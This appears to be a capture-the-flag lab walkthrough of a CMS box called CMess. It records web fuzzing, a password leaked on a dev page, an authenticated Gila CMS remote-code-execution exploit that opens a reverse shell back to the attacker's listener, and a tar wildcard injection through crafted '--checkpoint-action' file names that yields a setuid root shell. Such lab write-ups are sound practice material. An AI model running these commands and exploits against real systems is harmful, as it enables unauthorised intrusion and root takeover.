@@ -1,0 +1,158 @@
+
+
+
+┌──(root㉿kali)-[~]
+└─# dirb http://10.201.121.186
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Oct 31 12:15:57 2025
+URL_BASE: http://10.201.121.186/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.201.121.186/ ----
++ http://10.201.121.186/0 (CODE:200|SIZE:3866)                                                                      
++ http://10.201.121.186/01 (CODE:200|SIZE:4098)                                                                     
++ http://10.201.121.186/1 (CODE:200|SIZE:4098)                                                                      
++ http://10.201.121.186/1x1 (CODE:200|SIZE:4098)                                                                    
++ http://10.201.121.186/about (CODE:200|SIZE:3363)                                                                  
++ http://10.201.121.186/About (CODE:200|SIZE:3349)                                                                  
++ http://10.201.121.186/admin (CODE:200|SIZE:1585) 
+
+┌──(root㉿kali)-[~]
+└─# wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://10.201.121.186/ -H "Host: FUZZ.cmess.thm" --hl 107
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.201.121.186/
+Total requests: 19966
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000019:   200        30 L     104 W      934 Ch      "dev" 
+
+
+we get this on the dev.cmess.thm webpage
+
+Development Log
+andre@cmess.thm
+
+Have you guys fixed the bug that was found on live?
+support@cmess.thm
+
+Hey Andre, We have managed to fix the misconfigured .htaccess file, we're hoping to patch it in the upcoming patch!
+support@cmess.thm
+
+Update! We have had to delay the patch due to unforeseen circumstances
+andre@cmess.thm
+
+That's ok, can you guys reset my password if you get a moment, I seem to be unable to get onto the admin panel.
+support@cmess.thm
+
+Your password has been reset. Here: KPFTN_f2yxe%
+
+we login
+http://10.201.121.186/admin/
+
+
+Gila CMS version 1.10.9 
+
+Gila CMS 1.10.9 - Remote Code Execution (RCE) (Authenticated)                      | php/webapps/51569.py
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 51569.py
+
+ ██████╗ ██╗██╗      █████╗      ██████╗███╗   ███╗███████╗    ██████╗  ██████╗███████╗
+██╔════╝ ██║██║     ██╔══██╗    ██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔════╝██╔════╝
+██║  ███╗██║██║     ███████║    ██║     ██╔████╔██║███████╗    ██████╔╝██║     █████╗
+██║   ██║██║██║     ██╔══██║    ██║     ██║╚██╔╝██║╚════██║    ██╔══██╗██║     ██╔══╝
+╚██████╔╝██║███████╗██║  ██║    ╚██████╗██║ ╚═╝ ██║███████║    ██║  ██║╚██████╗███████╗
+ ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝     ╚═════╝╚═╝     ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝╚══════╝
+
+                              by Unknown_Exploit
+
+Enter the target login URL (e.g., http://example.com/admin/): http://10.201.121.186/admin/
+Enter the email: andre@cmess.thm
+Enter the password: KPFTN_f2yxe%
+Enter the local IP (LHOST): 10.6.66.96
+Enter the local port (LPORT): 53
+File uploaded successfully.
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 53
+listening on [any] 53 ...
+connect to [10.6.66.96] from (UNKNOWN) [10.201.121.186] 58238
+bash: cannot set terminal process group (740): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@cmess:/var/www/html/tmp$ 
+
+
+www-data@cmess:/opt$ ls -lsa
+total 12
+4 drwxr-xr-x  2 root root 4096 Feb  6  2020 .
+4 drwxr-xr-x 22 root root 4096 Feb  6  2020 ..
+4 -rwxrwxrwx  1 root root   36 Feb  6  2020 .password.bak
+www-data@cmess:/opt$ 
+www-data@cmess:/opt$ cat .password.bak
+andres backup password
+UQfsdCB7aAP6
+www-data@cmess:/opt$ 
+
+
+andre@cmess:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
+
+
+
+andre@cmess:~/backup$ echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash' > shell.sh
+andre@cmess:~/backup$ chmod +x shell.sh
+andre@cmess:~/backup$ touch -- '--checkpoint=1'
+andre@cmess:~/backup$ touch -- '--checkpoint-action=exec=sh shell.sh'
+
+
+andre@cmess:/tmp$ ./rootbash -p
+rootbash-4.3# id
+uid=1000(andre) gid=1000(andre) euid=0(root) egid=0(root) groups=0(root),1000(andre)
+rootbash-4.3# 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
